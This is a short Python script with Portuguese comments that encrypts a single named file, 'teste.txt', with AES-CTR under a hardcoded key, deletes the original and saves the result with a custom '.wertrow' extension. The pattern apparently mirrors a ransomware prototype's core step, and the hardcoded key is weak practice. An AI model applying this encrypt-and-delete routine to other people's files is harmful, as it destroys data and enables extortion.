
import os
from Crypto.Cipher import AES

# Nome do arquivo alvo
file_name = "teste.txt"

# Abrir o arquivo original e ler os dados
with open(file_name, "rb") as f:
    file_data = f.read()

# Definir chave (16 bytes)
key = b"testecom16caract"  # exato 16 bytes

# Inicializar objeto AES em modo CTR
aes = AES.new(key, AES.MODE_CTR)

# Criptografar os dados
encrypted_data = aes.encrypt(file_data)

# Remover arquivo original
os.remove(file_name)

# Salvar arquivo criptografado com sufixo
encrypted_file_name = file_name + ".wertrow"
with open(encrypted_file_name, "wb") as f:
    # Salvar nonce + criptografado para descriptografia correta
    f.write(aes.nonce + encrypted_data)

print(f"Arquivo '{file_name}' criptografado para '{encrypted_file_name}' com sucesso.")
